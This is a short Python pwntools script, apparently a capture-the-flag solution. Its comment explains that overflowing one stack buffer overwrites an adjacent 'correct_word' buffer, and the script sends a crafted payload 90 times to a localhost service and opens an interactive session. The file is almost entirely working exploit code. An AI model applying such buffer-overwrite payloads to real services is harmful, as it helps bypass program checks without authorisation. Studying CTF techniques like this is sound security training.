import sys
from pwn import *

'''
Looking closely, we can see that the correct_word buffer is right on top of the guess_word buffer and the correct_word is calculated before our input is taken.
This means that we control the value of correct_word and we can just craft an input such that correct_word = guess_word
(90 times, of course.)
'''

full = b"aaaa\x00\x00\x00\x00"*2 + b"\n"
full = full * 90

p = remote("localhost", 7778)
p.send(full)
p.interactive()
